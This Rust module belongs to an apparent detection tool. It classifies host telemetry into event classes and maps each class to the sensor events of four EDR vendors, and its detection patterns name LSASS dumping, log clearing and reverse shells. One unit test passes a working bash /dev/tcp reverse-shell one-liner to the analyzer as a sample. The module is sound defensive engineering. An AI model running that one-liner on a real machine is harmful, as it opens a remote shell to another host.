//! EDR telemetry mapping. Each finding's native host telemetry is classified
//! into an event class (process creation, network connection, file write,
//! module load, …), and each class maps to the concrete sensor event or
//! hunting table the major EDRs surface it as. The class → vendor table is
//! embedded from `data/edr-telemetry.json`; the classifier is code so new KB
//! entries pick up EDR mappings for free as long as they use the established
//! telemetry vocabulary.

use std::collections::BTreeMap;

use clap::ValueEnum;
use serde::Deserialize;

use crate::model::{EdrMapping, Report};

const EMBEDDED: &str = include_str!("../data/edr-telemetry.json");

/// An EDR product to map telemetry against. `All` expands to every vendor.
#[derive(Clone, Copy, Debug, PartialEq, Eq, ValueEnum)]
pub enum Vendor {
    #[value(name = "crowdstrike", alias = "falcon", alias = "cs")]
    CrowdStrike,
    #[value(name = "defender", alias = "mde", alias = "msde")]
    Defender,
    #[value(name = "sentinelone", alias = "s1")]
    SentinelOne,
    #[value(name = "elastic", alias = "elastic-defend")]
    Elastic,
    #[value(name = "all")]
    All,
}

/// The four concrete vendors in a stable display order.
const ALL_VENDORS: [Vendor; 4] = [
    Vendor::CrowdStrike,
    Vendor::Defender,
    Vendor::SentinelOne,
    Vendor::Elastic,
];

impl Vendor {
    /// The JSON key this vendor is stored under. `All` has none.
    fn key(self) -> Option<&'static str> {
        match self {
            Vendor::CrowdStrike => Some("crowdstrike"),
            Vendor::Defender => Some("defender"),
            Vendor::SentinelOne => Some("sentinelone"),
            Vendor::Elastic => Some("elastic"),
            Vendor::All => None,
        }
    }

    /// Expand to the concrete vendors this selection covers, in display order.
    pub fn expand(self) -> Vec<Vendor> {
        match self {
            Vendor::All => ALL_VENDORS.to_vec(),
            v => vec![v],
        }
    }
}

#[derive(Deserialize)]
struct EdrData {
    note: String,
    /// vendor key -> human label.
    vendors: BTreeMap<String, String>,
    /// event-class key -> per-vendor events.
    classes: BTreeMap<String, ClassEntry>,
}

#[derive(Deserialize)]
struct ClassEntry {
    #[allow(dead_code)]
    label: String,
    /// vendor key -> sensor events for this class.
    #[serde(flatten)]
    vendors: BTreeMap<String, Vec<String>>,
}

/// Telemetry classification rules, most-specific first. Each native telemetry
/// line is assigned to the first class any of whose patterns it contains
/// (case-insensitive). Generic process execution is last so it acts as a
/// near-fallback; a finding that classifies to nothing is treated as a process
/// creation, since every modeled action is ultimately a command that ran.
const RULES: &[(&str, &[&str])] = &[
    (
        "process_access",
        &[
            "process access",
            "eid 10",
            "sekurlsa",
            "readprocessmemory",
            "lsass memory",
            "memory of lsass",
            "handle to lsass",
            "minidump",
            "ptrace()",
            "pid 1 namespaces",
        ],
    ),
    (
        "log_clear",
        &[
            "1102",
            "log cleared",
            "log erase",
            "audit log",
            "wevtutil",
            "clear-eventlog",
            "clears the",
            "vacuum",
            "audit rule",
            "history to /dev/null",
            "history logging disabled",
        ],
    ),
    ("registry_set", &["registry", "eid 13", "run key", "asep"]),
    (
        "image_load",
        &[
            "image load",
            "eid 7",
            "eid 6",
            "driver load",
            "kernel module",
            "kextload",
            "kext load",
            "insmod",
            "modprobe",
            " lkm",
            "dll load",
            "init_module",
        ],
    ),
    (
        "scheduled_task",
        &[
            "scheduled task",
            "4698",
            "schtasks",
            "cron",
            "launchd job",
            "periodic script",
            " at job",
            "atrun",
            "enabling a timer",
        ],
    ),
    (
        "service_change",
        &[
            "service install",
            "7045",
            "sc.exe create",
            "systemd",
            "launchdaemon",
            "launchctl",
            "4697",
            "new service",
        ],
    ),
    (
        "ps_script",
        &["scriptblock", "4104", "amsi", "script block"],
    ),
    (
        "authentication",
        &[
            "logon",
            "4624",
            "4720",
            "4732",
            "4625",
            "account created",
            "member added",
            "4768",
            "4769",
            "4662",
            "4776",
            "kerberos",
            "tgs-req",
            "as-req",
            "ds-replication",
            "drsuapi",
            "auth event",
        ],
    ),
    (
        "permission_change",
        &[
            "chmod",
            "setmode",
            "setflags",
            "chattr",
            "chflags",
            "immutable",
            "setextattr",
            "quarantine",
            "execute bit",
            "host capabilities",
        ],
    ),
    (
        "network_connection",
        &[
            "connect",
            "eid 3",
            "socket",
            "bind",
            "listen",
            "outbound",
            "netlink",
            "tcp/",
            "networkextension",
            "pf log",
            "network connection",
            "remote host",
            "remote ip",
            "reverse shell",
            "ldap",
            "dns quer",
            "proxy chain",
            "tunnel",
            "bits-client",
            "netfilter",
            "samr",
        ],
    ),
    (
        "file_write",
        &[
            "write()",
            "create()",
            "eid 11",
            "file create",
            "notify_write",
            "notify_create",
            "written",
            "truncate",
            "unlink",
            "writes to",
            "overwrit",
            "write to /sys",
            "rc.local",
            "utime",
        ],
    ),
    (
        "file_access",
        &[
            "openat",
            "notify_open",
            "esf open",
            "read by",
            "reads",
            " read()",
            "read of",
            "open of",
            "opens ",
            "access to",
            "getxattr",
            "cpassword",
        ],
    ),
    (
        "process_creation",
        &[
            "execve",
            "eid 1",
            "4688",
            "notify_exec",
            "process creation",
            "process create",
            "esf exec",
            "shell process",
            "spawn",
            "memory-only",
            "child process",
            "interpreter",
            "processrollup",
            "wmi",
            "wsmprovhost",
            "ntdsutil",
            "vssadmin",
            "suid",
        ],
    ),
];

/// Classify a single native telemetry line into an event-class key.
fn classify_line(line: &str) -> Option<&'static str> {
    let l = line.to_lowercase();
    for (class, pats) in RULES {
        if pats.iter().any(|p| l.contains(p)) {
            return Some(class);
        }
    }
    None
}

/// The event classes a finding's telemetry maps to, unique and in first-seen
/// order. Defaults to a single `process_creation` when nothing else matches.
fn classes_for(telemetry: &[String]) -> Vec<&'static str> {
    let mut out: Vec<&'static str> = Vec::new();
    for line in telemetry {
        if let Some(c) = classify_line(line)
            && !out.contains(&c)
        {
            out.push(c);
        }
    }
    if out.is_empty() {
        out.push("process_creation");
    }
    out
}

/// Annotate every finding in `report` with the sensor events the requested
/// `vendors` would surface. Returns the mapping's caveat note for display.
pub fn annotate(report: &mut Report, vendors: &[Vendor]) -> String {
    let data: EdrData =
        serde_json::from_str(EMBEDDED).expect("embedded edr-telemetry.json must parse");

    // Expand + de-duplicate the requested vendors, preserving display order.
    let mut wanted: Vec<Vendor> = Vec::new();
    for v in vendors {
        for e in v.expand() {
            if !wanted.contains(&e) {
                wanted.push(e);
            }
        }
    }

    for f in &mut report.findings {
        let classes = classes_for(&f.telemetry);
        let mut mappings: Vec<EdrMapping> = Vec::new();
        for v in &wanted {
            let Some(vkey) = v.key() else { continue };
            let label = data
                .vendors
                .get(vkey)
                .cloned()
                .unwrap_or_else(|| vkey.to_string());
            let mut events: Vec<String> = Vec::new();
            for c in &classes {
                if let Some(entry) = data.classes.get(*c)
                    && let Some(evs) = entry.vendors.get(vkey)
                {
                    for e in evs {
                        if !events.contains(e) {
                            events.push(e.clone());
                        }
                    }
                }
            }
            if !events.is_empty() {
                mappings.push(EdrMapping {
                    vendor: label,
                    events,
                });
            }
        }
        f.edr = mappings;
    }

    data.note
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn embedded_data_parses_and_covers_all_classes() {
        let data: EdrData = serde_json::from_str(EMBEDDED).unwrap();
        // Every class every RULE can emit must exist in the mapping table, and
        // every class must carry all four vendors.
        for (class, _) in RULES {
            let entry = data
                .classes
                .get(*class)
                .unwrap_or_else(|| panic!("class {class} missing from edr-telemetry.json"));
            for vkey in ["crowdstrike", "defender", "sentinelone", "elastic"] {
                assert!(
                    entry.vendors.get(vkey).is_some_and(|v| !v.is_empty()),
                    "class {class} missing vendor {vkey}"
                );
            }
        }
    }

    #[test]
    fn classifies_representative_lines() {
        assert_eq!(
            classify_line("ES_EVENT_TYPE_NOTIFY_EXEC of /bin/ps"),
            Some("process_creation")
        );
        assert_eq!(
            classify_line("Sysmon EID 3 (network) from powershell.exe"),
            Some("network_connection")
        );
        assert_eq!(
            classify_line("Sysmon EID 10 (Process Access) to lsass.exe"),
            Some("process_access")
        );
        assert_eq!(
            classify_line("ES_EVENT_TYPE_NOTIFY_OPEN of ~/.ssh/id_rsa"),
            Some("file_access")
        );
        assert_eq!(
            classify_line("Sysmon EID 13 (Registry Set) under ...\\Run"),
            Some("registry_set")
        );
        assert_eq!(
            classify_line("Security 1102 (audit log cleared)"),
            Some("log_clear")
        );
    }

    #[test]
    fn empty_telemetry_defaults_to_process_creation() {
        assert_eq!(classes_for(&[]), vec!["process_creation"]);
    }

    #[test]
    fn tightened_patterns_avoid_known_false_matches() {
        // "kext" must not match inside "NetworkExtension".
        assert_eq!(
            classify_line("outbound socket observed via a NetworkExtension flow / pf log"),
            Some("network_connection")
        );
        // Reading utmp/wtmp is discovery, not a log clear.
        assert_eq!(
            classify_line("ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/last reading utmpx"),
            Some("process_creation")
        );
        assert_eq!(classify_line("read of /var/log/wtmp"), Some("file_access"));
        // A sudo audit line is not a logon event.
        assert_eq!(
            classify_line("auditd USER_CMD / sudo log entry in /var/log/auth.log"),
            None
        );
    }

    #[test]
    fn annotate_populates_and_dedups_events() {
        use crate::kb;

        let mac = kb::load(kb::Platform::MacosEs).unwrap();
        // A reverse shell is one combined exec+network line: it should map to
        // the network event class for every requested vendor.
        let mut report = crate::analyzer::analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &mac);
        let note = annotate(&mut report, &[Vendor::All]);
        assert!(!note.is_empty());

        let f = report
            .findings
            .iter()
            .find(|f| f.rule_id == "reverse-shell-devtcp")
            .unwrap();
        assert_eq!(f.edr.len(), 4, "all four vendors mapped");
        let cs = f
            .edr
            .iter()
            .find(|m| m.vendor.contains("CrowdStrike"))
            .unwrap();
        assert!(cs.events.iter().any(|e| e.contains("NetworkConnectIP4")));
        // Events are deduplicated within a vendor.
        let mut sorted = cs.events.clone();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), cs.events.len());
    }

    #[test]
    fn single_vendor_maps_only_that_vendor() {
        use crate::kb;
        let win = kb::load(kb::Platform::WindowsSysmon).unwrap();
        let mut report = crate::analyzer::analyze("whoami", &win);
        annotate(&mut report, &[Vendor::Defender]);
        let f = &report.findings[0];
        assert_eq!(f.edr.len(), 1);
        assert_eq!(f.edr[0].vendor, "Microsoft Defender for Endpoint");
        assert_eq!(f.edr[0].events, vec!["DeviceProcessEvents"]);
    }

    #[test]
    fn vendor_all_expands_to_four_unique() {
        assert_eq!(Vendor::All.expand().len(), 4);
        assert_eq!(Vendor::CrowdStrike.expand(), vec![Vendor::CrowdStrike]);
    }

    #[test]
    fn no_kb_entry_silently_defaults_to_process_creation() {
        // Re-audit guard: every KB entry that carries telemetry must have at
        // least one line an EDR class pattern recognizes. Otherwise classes_for
        // falls back to the process_creation default and mislabels the entry —
        // as the Kerberos/AD entries did before this classifier re-audit.
        // Individual lines may still be intentionally unmapped (e.g. sudo audit
        // records), as long as the entry classifies via another line.
        let mut defaulters: Vec<String> = Vec::new();
        for platform in [
            crate::kb::Platform::LinuxAuditd,
            crate::kb::Platform::WindowsSysmon,
            crate::kb::Platform::MacosEs,
        ] {
            let kb = crate::kb::load(platform).expect("knowledge base loads");
            for entry in &kb.entries {
                if !entry.telemetry.is_empty()
                    && !entry.telemetry.iter().any(|l| classify_line(l).is_some())
                {
                    defaulters.push(format!("[{platform:?}] {}", entry.id));
                }
            }
        }
        assert!(
            defaulters.is_empty(),
            "KB entries whose telemetry matches no EDR class ({} — would default to \
             process_creation); extend RULES in edr.rs:\n{}",
            defaulters.len(),
            defaulters.join("\n")
        );
    }
}
